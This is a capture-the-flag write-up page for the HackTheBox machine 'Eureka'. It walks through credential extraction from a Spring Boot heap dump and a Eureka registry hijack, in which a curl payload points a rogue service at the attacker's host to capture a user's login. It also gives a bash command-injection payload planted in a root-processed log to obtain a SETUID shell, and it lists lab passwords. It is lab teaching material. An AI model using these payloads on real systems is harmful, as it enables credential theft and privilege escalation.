<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="index, follow">
    <title>Eureka - Hexicon Archives</title>
    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
    <link rel="stylesheet" href="../style.css">
    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Eureka.html" />
    <!-- Machine-specific metadata for SEO -->
    <meta name="description" content="Detailed writeup for Eureka machine from HackTheBox - Hard difficulty level">
    <meta name="keywords" content="HackTheBox, Eureka, Hard, CTF, writeup, cybersecurity, penetration testing, Hexicon">
</head>
<body>
    <header>
        <div class="container header-content">
            <a href="../machines.html" class="logo">Machine writeups</a>
            <div class="header-controls">
                <a href="../index.html" class="htb-icon" title="Link to the main page">
                    <img src="../favicon.png" alt="Archive" width="30" height="30">
                </a>
                <div class="hamburger-menu">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
            </div>
        </div>
    </header>
    
    <div class="sidebar">
        <div class="difficulty-buttons">
            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
            <div class="machine-list" id="easy-machines">
                <!-- Will be populated dynamically -->
            </div>
            
            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
            <div class="machine-list" id="medium-machines">
                <!-- Will be populated dynamically -->
            </div>
            
            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
            <div class="machine-list" id="hard-machines">
                <!-- Will be populated dynamically -->
            </div>

            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
            <div class="machine-list" id="insane-machines">
                <!-- Will be populated dynamically -->
            </div>
        </div>
    </div>
    
    <div class="backdrop"></div>
    
    <main class="container writeup-content">
        <h1 class="writeup-title">Eureka</h1>
        <div class="writeup-metadata">
            <span class="difficulty hard">Hard</span>
            <span class="date">August 30, 2025</span>
        </div>
        
        <div class="writeup-container">
            <div class="writeup-body">
                <!-- Machine-specific content goes here -->
                <p><img alt="pwned" src="../images/Eureka/pwned.png" /></p>
<p>Eureka was a cool Linux box that started with a Spring Boot web application running on port 80, featuring an online furniture shop with user registration and blog functionality.
Initial reconnaissance revealed Spring Boot actuator endpoints exposed at /actuator, including a heap dump file that I downloaded for analysis.</p>
<p>Using Eclipse Memory Analyzer on the heap dump, I discovered MySQL credentials (oscar190:0sc@r190_S0l!dP@sswd) through OQL queries targeting password-related strings.
These credentials provided both SSH access to the box and database connectivity, revealing additional user hashes including one for miranda-wise.</p>
<p>Local port enumeration uncovered several internal services running on ports 8080-8082 and 8761.
Port forwarding revealed a Netflix Eureka service registry on 8761, which I accessed using credentials found in /var/www (EurekaSrvr:0scarPWDisTheB3st).
I exploited the Eureka service through SSRF by registering a malicious service instance pointing to my controlled server, which intercepted authentication attempts and revealed Miranda's credentials (miranda-wise:IL!veT0Be&amp;BeT0L0ve).</p>
<p>SSH access as Miranda provided the user flag and membership in the developers group.
Analysis of /opt/log_analyse.sh revealed a bash injection vulnerability in the HTTP status code processing function, where the -eq operator could be manipulated with command substitution.
Using pspy to monitor processes, I discovered a root cronjob executing this script against log files in directories writable by the developers group.</p>
<p>Privilege escalation was achieved by replacing the application log file with a malicious entry containing my payload.
When the root cronjob processed this log, it created a SETUID bash binary, which I executed with the -p flag to gain root access and complete the challenge.</p>
<h1>User flag</h1>
<p><img alt="nmap" src="../images/Eureka/nmap.png" /></p>
<p>Nmap scan reveals only two ports. I'll add the website to my host file in order to access it.</p>
<h2>Enumerating the website</h2>
<p>Its an online furniture shop. I can log in/register, browse/buy products, and read blogposts.</p>
<p>I can post comments under each post, so I'll check for XSS possibilities.</p>
<p><img alt="xss" src="../images/Eureka/xss.png" /></p>
<p>The HTML tags were displayed as text, which means that XSS is not possible here.</p>
<p>After messing around with the post ID in the search bar, I stumbled upon something very interesting.</p>
<p><img alt="error" src="../images/Eureka/error.png" /></p>
<p>The whitelabel error page is the default error response in Spring Boot. An open-source java web app framework.</p>
<p>From there, a simple search has led me to Spring Actuators, which could potentially expose some valuable data.</p>
<p><img alt="actuator" src="../images/Eureka/actuator.png" /></p>
<p>There are many endpoints here, but much of the "sensitive" data has been replaced with "<strong>*</strong>*".</p>
<p>This might be a security feature, and I can't really do much about it right now. I'll keep looking around.</p>
<p><img alt="features" src="../images/Eureka/features.png" /></p>
<p>The features endpoint returns the versions of three clients. In itself they might not be that useful, but they may point towards an approximate version of SpringBoot running on the box.</p>
<p>There is also the heapdump endpoint, which just lets me download a heapdump file onto my machine.</p>
<p>I'll use a memory analyzer to dig through it, as these heapfiles often contain sensitive data like passwords.</p>
<h2>Analyzing the heapdump file</h2>
<p>I will use the Eclipse memory analyzer tool for this task.</p>
<p><code>https://www.eclipse.org/downloads/download.php?file=/mat/1.16.1/rcp/MemoryAnalyzer-1.16.1.20250109-linux.gtk.x86_64.zip</code></p>
<p>After unzipping the file, I'll run it from the mat folder.</p>
<p>Inside the program, I can add the heap file by going to file -&gt; Open Heap Dump -&gt; Navigating to the heap file(Select "All Files" in the botton right).</p>
<p><img alt="mat" src="../images/Eureka/mat.png" /></p>
<p>I can perform many things now that the file is loaded. Manual searching is one of them, but there is also the option to use OQL(Object Query Language) queries to search for data more effectively.</p>
<p>I'll use OQL to make targeted queries in search of keywords.</p>
<p>There are many things I could check with a query. I'll start by looking through all of the linked hash maps for the string <code>password</code></p>
<p><code>select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains("password"))</code></p>
<p><img alt="password" src="../images/Eureka/password.png" /></p>
<p><code>oscar190:0sc@r190_S0l!dP@sswd</code></p>
<p>Found credentials for mysql! Looking at the whole value, I won't be able to connect to the database from my machine, because it is being run locally on the box.</p>
<h2>Logging into the box</h2>
<p>I logged in as oscar190 on the Furni website, but nothing new came up. No administrative panel, no secret files whatsoever.</p>
<p>I also tried to SSH into the box with the same credentials.</p>
<p><img alt="ssh" src="../images/Eureka/ssh.png" /></p>
<p>And it worked! I'll see what Oscar can do, remembering that mysql is running on the box.</p>
<p><code>mysql -u oscar190 -p</code></p>
<p><img alt="db" src="../images/Eureka/db.png" /></p>
<p>While the user does not have any noteworthy permissions, I did manage to connect to the database.</p>
<p>There's a bunch of users with hashes. The user flag was not in Oscar's directory, so I'll check what other users are present.</p>
<p><img alt="users" src="../images/Eureka/users.png" /></p>
<p>Miranda-wise is here as well. Her hash is present in the database, so I can take it and attempt cracking.</p>
<p>However, there are two very discouraging things about the hash.</p>
<ol>
<li>It was hashed with Bcrypt (Noticeable by the "$2a" bit)</li>
<li>It has a very big cost factor, which means that trying to crack it will take a very long time.</li>
</ol>
<p>Taking all that into account, I decided I'd try cracking it only as a last resort, if I did not find a different way forward.</p>
<h2>Discovering a local Eureka service</h2>
<p>Continuing my enumeration, I'll check for any locally-running services/listening ports.</p>
<p><img alt="ports" src="../images/Eureka/ports.png" /></p>
<p>There are a few interesting ports. 3306 is mysql, but 8080, 8081, 8082, and 8761 are unknown to me.</p>
<p>I will restart my SSH connection, this time forwarding all 4 ports to my machine.</p>
<p>I could use SOCKS as well, but since i don't need to reach any other machines(no tunneling), using SSH will be simpler.</p>
<p><code>SSH oscar190@furni.htb -L 8080:127.0.0.1:8080 -L 8081:127.0.0.1:8081 -L 8082:127.0.0.1:8082 -L 8761:127.0.0.1:8761</code></p>
<p>Checking out the forwarded ports, I can tell that:</p>
<ol>
<li>8080 and 8082 both point to a local furni website, without CSS.</li>
<li>8081 returns a whitelabel error.</li>
</ol>
<p><img alt="login" src="../images/Eureka/login.png" /></p>
<p>8761 prompts for credentials, and the previous ones do not work. I need to find a new set of creds to progress.</p>
<h3>Scanning /var/www for credentials</h3>
<p>I moved into the /var/www/ directory. I'll use grep to search for any hardcoded credentials there.</p>
<p>My reasoning behind this is that since the local ports are running websites/services, there may be some encoded credentials in the related directories.</p>
<p><code>grep -R 'password'</code></p>
<p><img alt="pwd" src="../images/Eureka/pwd.png" /></p>
<p>Found a new password. The old one was found as well, a bit further up.</p>
<p><code>grep -R 'name'</code></p>
<p>And a name as well!</p>
<p><code>EurekaSrvr:0scarPWDisTheB3st</code></p>
<p>A whole new set of credentials. I'll try those against the local service right away.</p>
<p><img alt="eureka" src="../images/Eureka/eureka.png" /></p>
<h2>SSRF on the Eureka instance</h2>
<p>Eureka Server acts as a service registry where all the services in a microservice system register themselves. </p>
<p>I can see 3 of those, which I've already checked out earlier.</p>
<p>After a bit of research on Spring Eureka, I found a promising way to exploit it.</p>
<p><code>https://medium.com/@mfocuz/hacking-netflix-eureka-8e5957b2f539</code></p>
<p>It may be possible to perform SSRF by modifying an existing service with an additional link to a malicious server.</p>
<p>In theory, the requests should come both to the original server and my receiver</p>
<p>To start off, I'll take a good look at the payload from the post. Then I'll modify it accordingly for my attack.</p>
<div class="codehilite"><pre><span></span><code><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">X</span><span class="w"> </span><span class="n">POST</span><span class="w"> </span><span class="ss">&quot;http://127.0.0.1:8761/eureka/apps/USER-MANAGEMENT-SERVICE&quot;</span><span class="w"> </span><span class="err">\</span>
<span class="w">  </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="ss">&quot;EurekaSrvr:0scarPWDisTheB3st&quot;</span><span class="w"> </span><span class="err">\</span>
<span class="w">  </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="ss">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="err">\</span>
<span class="w">  </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="ss">&quot;User-Agent: Java/11.0.10&quot;</span><span class="w"> </span><span class="err">\</span>
<span class="w">  </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="s1">&#39;{</span>
<span class="s1">    &quot;instance&quot;: {</span>
<span class="s1">      &quot;instanceId&quot;: &quot;attacker-instance:USER-MANAGEMENT-SERVICE:9002&quot;,</span>
<span class="s1">      &quot;hostName&quot;: &quot;10.10.16.15&quot;,</span>
<span class="s1">      &quot;app&quot;: &quot;USER-MANAGEMENT-SERVICE&quot;,</span>
<span class="s1">      &quot;ipAddr&quot;: &quot;10.10.16.15&quot;,</span>
<span class="s1">      &quot;status&quot;: &quot;UP&quot;,</span>
<span class="s1">      &quot;port&quot;: {&quot;$&quot;: 9002, &quot;@enabled&quot;: &quot;true&quot;},</span>
<span class="s1">      &quot;healthCheckUrl&quot;: &quot;http://10.10.16.15:9002/health&quot;,</span>
<span class="s1">      &quot;statusPageUrl&quot;: &quot;http://10.10.16.15:9002/info&quot;,</span>
<span class="s1">      &quot;homePageUrl&quot;: &quot;http://10.10.16.15:9002/&quot;,</span>
<span class="s1">      &quot;vipAddress&quot;: &quot;USER-MANAGEMENT-SERVICE&quot;,</span>
<span class="s1">      &quot;secureVipAddress&quot;: &quot;USER-MANAGEMENT-SERVICE&quot;,</span>
<span class="s1">      &quot;dataCenterInfo&quot;: {</span>
<span class="s1">        &quot;@class&quot;: &quot;com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo&quot;,</span>
<span class="s1">        &quot;name&quot;: &quot;MyOwn&quot;</span>
<span class="s1">      },</span>
<span class="s1">      &quot;metadata&quot;: {&quot;management.port&quot;: &quot;9002&quot;}</span>
<span class="s1">    }</span>
<span class="s1">  }&#39;</span>
</code></pre></div>

<p>After sending the curl request, I can see that my malicious update has been successfully added.</p>
<p><img alt="eureka2" src="../images/Eureka/eureka2.png" /></p>
<p>After clicking the new link, I got a response on my python server.</p>
<p><img alt="response" src="../images/Eureka/response.png" /></p>
<p>And soon after that, 3 more requests from the box followed.</p>
<p><img alt="response2" src="../images/Eureka/response2.png" /></p>
<p>Someone is trying to log in! I have to modify my python server to accommodate for the POST method.</p>
<div class="codehilite"><pre><span></span><code><span class="c1"># serv.py file</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">http.server</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">socketserver</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="n">PORT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">9002</span>

<span class="k">class</span><span class="w"> </span><span class="nc">MyHandler</span><span class="p">(</span><span class="n">http</span><span class="o">.</span><span class="n">server</span><span class="o">.</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
<span class="w">    </span><span class="k">def</span><span class="w"> </span><span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Received GET request: </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Headers: </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
<span class="w">        </span><span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s1">&#39;Content-type&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
<span class="w">        </span><span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;{&quot;status&quot;:&quot;UP&quot;}&#39;</span><span class="p">)</span>

<span class="w">    </span><span class="k">def</span><span class="w"> </span><span class="nf">do_POST</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="n">content_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Length&#39;</span><span class="p">])</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="s1">&#39;Content-Length&#39;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="mi">0</span>
<span class="w">        </span><span class="n">post_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="o">.</span><span class="n">rfile</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">content_length</span><span class="p">)</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Received POST request to: </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Headers: </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;POST data: </span><span class="si">{</span><span class="n">post_data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="w">        </span><span class="c1"># For login endpoint, return a successful response with a fake token</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;/login&#39;</span><span class="p">:</span>
<span class="w">            </span><span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
<span class="w">            </span><span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s1">&#39;Content-type&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="p">)</span>
<span class="w">            </span><span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
<span class="w">        </span><span class="k">else</span><span class="p">:</span>
<span class="w">            </span><span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
<span class="w">            </span><span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s1">&#39;Content-type&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="p">)</span>
<span class="w">            </span><span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
<span class="w">            </span><span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;{&quot;status&quot;:&quot;success&quot;}&#39;</span><span class="p">)</span>

<span class="k">with</span><span class="w"> </span><span class="n">socketserver</span><span class="o">.</span><span class="n">TCPServer</span><span class="p">((</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">PORT</span><span class="p">),</span><span class="w"> </span><span class="n">MyHandler</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">httpd</span><span class="p">:</span>
<span class="w">    </span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Serving at port </span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</code></pre></div>

<p><img alt="response3" src="../images/Eureka/response3.png" /></p>
<p>Miranda-Wise tried authenticating to my server. Her password has a few urlencoded characters, so I'll use cyberchef to decode the full password.</p>
<p><code>miranda-wise:IL!veT0Be&amp;BeT0L0ve</code></p>
<p>I will SSH into the box as Miranda. Earlier, I saw that she was the other user present on the box, so the user flag should be located in her home directory.</p>
<p><img alt="user" src="../images/Eureka/user.png" /></p>
<h1>Root flag</h1>
<p>Miranda is a member of the developers group, but there's not much aside from that.</p>
<p>I'll search the available directories for anything interesting.</p>
<p>In the /opt directory, I found a few things.</p>
<p><img alt="opt" src="../images/Eureka/opt.png" /></p>
<p>I don't have access to scripts and heapdump, but I can read the log_analyse.sh script.</p>
<p>I'll run it first to see what will happen. It needs a .log file as an argument, so I'll give it a log from the web directory.</p>
<p><img alt="output" src="../images/Eureka/output.png" /></p>
<p>It outputs a nicely colored set of data. It also attempted to create a .txt file, but failed.</p>
<p>Most likely, Miranda does not have the permission to create files in /opt, hence why the script failed to do so since I ran it as Miranda.</p>
<h2>Analyzing the bash script</h2>
<p>After reviewing the script, I confirmed that what I said above was true.</p>
<p>Additionally, I noticed a potential vulnerability in how the script handles data.</p>
<p>Let's have a look at the vulnerable function:</p>
<div class="codehilite"><pre><span></span><code>analyze_http_statuses()<span class="w"> </span>{
<span class="w">    </span>#<span class="w"> </span>Process<span class="w"> </span>HTTP<span class="w"> </span>status<span class="w"> </span>codes
<span class="w">    </span>while<span class="w"> </span>IFS=<span class="w"> </span>read<span class="w"> </span>-r<span class="w"> </span>line;<span class="w"> </span>do
<span class="w">        </span>code=$(echo<span class="w"> </span>&quot;<span class="nv">$line</span>&quot;<span class="w"> </span>|<span class="w"> </span>grep<span class="w"> </span>-oP<span class="w"> </span>&#39;Status:<span class="w"> </span>\K.*&#39;)
<span class="w">        </span>found=0
<span class="w">        </span>#<span class="w"> </span>Check<span class="w"> </span>if<span class="w"> </span>code<span class="w"> </span>exists<span class="w"> </span>in<span class="w"> </span>STATUS_CODES<span class="w"> </span>array
<span class="w">        </span>for<span class="w"> </span>i<span class="w"> </span>in<span class="w"> </span>&quot;<span class="cp">${</span><span class="err">!</span><span class="n">STATUS_CODES</span><span class="p">[</span><span class="o">@</span><span class="p">]</span><span class="cp">}</span>&quot;;<span class="w"> </span>do
<span class="w">            </span>existing_entry=&quot;<span class="cp">${</span><span class="n">STATUS_CODES</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">]</span><span class="cp">}</span>&quot;
<span class="w">            </span>existing_code=$(echo<span class="w"> </span>&quot;<span class="nv">$existing_entry</span>&quot;<span class="w"> </span>|<span class="w"> </span>cut<span class="w"> </span>-d&#39;:&#39;<span class="w"> </span>-f1)
<span class="w">            </span>existing_count=$(echo<span class="w"> </span>&quot;<span class="nv">$existing_entry</span>&quot;<span class="w"> </span>|<span class="w"> </span>cut<span class="w"> </span>-d&#39;:&#39;<span class="w"> </span>-f2)
<span class="w">            </span>if<span class="w"> </span>[[<span class="w"> </span>&quot;<span class="nv">$existing_code</span>&quot;<span class="w"> </span>-eq<span class="w"> </span>&quot;<span class="nv">$code</span>&quot;<span class="w"> </span>]];<span class="w"> </span>then
<span class="w">                </span>new_count=$((existing_count<span class="w"> </span>+<span class="w"> </span>1))
<span class="w">                </span>STATUS_CODES[<span class="nv">$i</span>]=&quot;<span class="cp">${</span><span class="n">existing_code</span><span class="cp">}</span>:<span class="cp">${</span><span class="n">new_count</span><span class="cp">}</span>&quot;
<span class="w">                </span>break
<span class="w">            </span>fi
<span class="w">        </span>done
<span class="w">    </span>done<span class="w"> </span><span class="err">&lt;</span><span class="w"> </span><span class="err">&lt;</span>(grep<span class="w"> </span>&quot;HTTP.*Status:<span class="w"> </span>&quot;<span class="w"> </span>&quot;<span class="nv">$LOG_FILE</span>&quot;)
}
</code></pre></div>

<p>The first thing this function does is grabbing each line, and extracting 'Status:' from it.</p>
<p>It then removes everything from the status all the way to the end of the line(\K), ideally only leaving the status code.</p>
<p>The output of that operation is then saved as $code, and passed all the way down to the -eq operator. -eq expects a numerical value, which I'll keep in mind.</p>
<p>To make a valid payload, the line it is on must contain "Status:". Otherwise, it won't be picked up by grep.</p>
<p>In order to make bash treat my payload as numerical, I can pass it within an array. The script will fail, but not before executing whatever command is inside the array.</p>
<p><code>HTTPtestStatus: a[$(cp /bin/bash /tmp/test &amp;&amp; chmod +s /tmp/test)]</code></p>
<p>I appended this payload to a brand new test.log file located in my home directory and ran the script.</p>
<p><img alt="bin" src="../images/Eureka/bin.png" /></p>
<p>It worked, but the result was a SETUID bash with Miranda's rights. I need to find a way to force root to do the same.</p>
<p>Looking at the cron jobs did not give me anything, as there weren't any visible. To confirm that for sure, I transferred and executed pspy on the box.</p>
<h2>Discovering "hidden" root cronjobs with pspy</h2>
<p><img alt="pspy" src="../images/Eureka/pspy.png" /></p>
<p>Root is running the script against the .log files in the user-management-service and cloud-service directories.</p>
<p><img alt="perm" src="../images/Eureka/perm.png" /></p>
<p>Miranda is in the developers group, which means that I can modify the log folder and somewhat its contents as well.</p>
<p>However, because Miranda does not have direct permission over the contents of /log, I can only remove the contents. That should still be enough, though.</p>
<h2>Setting up for root command injection</h2>
<p>I will first remove the application.log file entirely, then I'll make a new one by echoing my payload directly. That will create a new file if one does not exist already.</p>
<div class="codehilite"><pre><span></span><code><span class="n">rm</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">web</span><span class="o">/</span><span class="n">user</span><span class="o">-</span><span class="n">management</span><span class="o">-</span><span class="n">service</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">application</span><span class="o">.</span><span class="n">log</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s1">&#39;HTTPtestStatus: a[$(cp /bin/bash /tmp/privesc &amp;&amp; chmod +s /tmp/privesc)]&#39;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">web</span><span class="o">/</span><span class="n">user</span><span class="o">-</span><span class="n">management</span><span class="o">-</span><span class="n">service</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">application</span><span class="o">.</span><span class="n">log</span>
</code></pre></div>

<p><img alt="remove" src="../images/Eureka/remove.png" /></p>
<p>And after a moment, the privesc SETUID binary was created.</p>
<p><img alt="privesc" src="../images/Eureka/privesc.png" /></p>
<p>All that's left is to run it with -p to preserve rights.</p>
<p><img alt="root" src="../images/Eureka/root.png" /></p>
<p>Rooted!</p>
            </div>
            
            <div class="toc-sidebar">
                <h3>Contents</h3>
                <ul id="toc-list">
                    <!-- This will be populated by JavaScript -->
                </ul>
            </div>
        </div>
    </main>
    
    <!-- Mobile TOC toggle button -->
    <button class="toc-toggle" aria-label="Toggle table of contents">
        â‰¡
    </button>
    
    <footer>
        <div class="container">
            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
        </div>
    </footer>

    <!-- Include the Markdown parser (not needed for static HTML) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
    
    <script>
        // Machine metadata for sidebar population
        let machineData = {};
        
        // Function to initialize the application
        async function initializeApp() {
            try {
                // Fetch machine metadata
                const response = await fetch('../machines.json');
                if (!response.ok) {
                    throw new Error('Failed to load machine metadata');
                }
                machineData = await response.json();
                
                // Populate the sidebar with machine links
                populateSidebar();
                
                // Generate table of contents
                generateTableOfContents();
            } catch (error) {
                console.error('Initialization error:', error);
                showError("Failed to initialize application. Please refresh and try again.");
            }
        }

        // Call the initialization function when the page loads
        document.addEventListener('DOMContentLoaded', initializeApp);

        // Populate sidebar with machine links dynamically
        function populateSidebar() {
            const categories = {
                "easy": document.getElementById("easy-machines"),
                "medium": document.getElementById("medium-machines"),
                "hard": document.getElementById("hard-machines"),
                "insane": document.getElementById("insane-machines")
            };

            // Clear existing links
            for (const category of Object.values(categories)) {
                category.innerHTML = '';
            }

            // Add machine links to appropriate categories
            for (const [machineName, data] of Object.entries(machineData)) {
                const difficulty = data.difficulty.toLowerCase();
                if (categories[difficulty]) {
                    const link = document.createElement('a');
                    link.href = `../machines/${machineName}.html`;
                    link.textContent = data.title;
                    
                    // Highlight current machine
                    if (data.title === "Eureka") {
                        link.classList.add('active');
                    }
                    
                    categories[difficulty].appendChild(link);
                }
            }
        }

        // Generate table of contents from headings
        function generateTableOfContents() {
            const writeupBody = document.querySelector('.writeup-body');
            const tocList = document.getElementById('toc-list');
            const headings = writeupBody.querySelectorAll('h1, h2, h3');
            
            // Clear existing TOC
            tocList.innerHTML = '';
            
            headings.forEach((heading, index) => {
                // Create an ID for the heading if it doesn't have one
                if (!heading.id) {
                    // Convert heading text to kebab-case for ID
                    const headingText = heading.textContent.trim();
                    const headingId = headingText
                        .toLowerCase()
                        .replace(/[^\w\s-]/g, '')
                        .replace(/\s+/g, '-');
                    
                    heading.id = headingId || `section-${index}`;
                }
                
                // Create a list item for the TOC
                const listItem = document.createElement('li');
                const link = document.createElement('a');
                link.href = `#${heading.id}`;
                link.textContent = heading.textContent;
                
                // Add a class for h2 elements to create indentation
                if (heading.tagName === 'H2') {
                    listItem.classList.add('sub-heading');
                    listItem.style.paddingLeft = '15px';
                } else if (heading.tagName === 'H3') {
                    listItem.classList.add('sub-sub-heading');
                    listItem.style.paddingLeft = '30px';
                }
                
                listItem.appendChild(link);
                tocList.appendChild(listItem);
            });
            
            // Set up scroll highlighting
            setupScrollHighlighting();
        }

        // Highlight active TOC section on scroll
        function setupScrollHighlighting() {
            const tocLinks = document.querySelectorAll('.toc-sidebar a');
            
            function highlightActiveSection() {
                // Find which section is currently in view
                const fromTop = window.scrollY + 120;
                
                tocLinks.forEach(link => {
                    const section = document.querySelector(link.hash);
                    
                    if (section && 
                        section.offsetTop <= fromTop &&
                        section.offsetTop + section.offsetHeight > fromTop) {
                        link.classList.add('active');
                    } else {
                        link.classList.remove('active');
                    }
                });
            }
            
            // Call initially and on scroll
            window.addEventListener('scroll', highlightActiveSection);
            highlightActiveSection();
        }

        // Show error message
        function showError(message) {
            const contentArea = document.querySelector('.writeup-body');
            contentArea.innerHTML = `
                <div class="error-message">
                    <h2>Error</h2>
                    <p>${message}</p>
                </div>
            `;
        }

        // Initialize the page
        document.addEventListener('DOMContentLoaded', function() {
            // Hamburger menu functionality
            const hamburgerMenu = document.querySelector('.hamburger-menu');
            const sidebar = document.querySelector('.sidebar');
            const backdrop = document.querySelector('.backdrop');
            
            hamburgerMenu.addEventListener('click', () => {
                hamburgerMenu.classList.toggle('active');
                sidebar.classList.toggle('active');
                backdrop.classList.toggle('active');
            });
            
            backdrop.addEventListener('click', () => {
                hamburgerMenu.classList.remove('active');
                sidebar.classList.remove('active');
                backdrop.classList.remove('active');
                tocSidebar.classList.remove('active');
            });
            
            // Difficulty buttons functionality
            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
            
            difficultyButtons.forEach(button => {
                button.addEventListener('click', () => {
                    const difficulty = button.getAttribute('data-difficulty');
                    const machineList = document.querySelector(`#${difficulty}-machines`);
                    
                    machineList.classList.toggle('active');
                });
            });
            
            // Mobile TOC toggle
            const tocToggle = document.querySelector('.toc-toggle');
            const tocSidebar = document.querySelector('.toc-sidebar');
            
            tocToggle.addEventListener('click', () => {
                tocSidebar.classList.toggle('active');
                backdrop.classList.toggle('active');
            });
            
            // Close TOC sidebar when clicking on a link (mobile)
            document.querySelectorAll('.toc-sidebar a').forEach(link => {
                link.addEventListener('click', () => {
                    if (window.innerWidth <= 1024) {
                        tocSidebar.classList.remove('active');
                        backdrop.classList.remove('active');
                    }
                });
            });
        });

        // Add smooth scrolling for TOC links
        document.addEventListener('click', function(e) {
            if (e.target.tagName === 'A' && e.target.hash) {
                const element = document.querySelector(e.target.hash);
                if (element) {
                    e.preventDefault();
                    window.scrollTo({
                        top: element.offsetTop - 90,
                        behavior: 'smooth'
                    });
                }
            }
        });
    </script>
</body>
</html>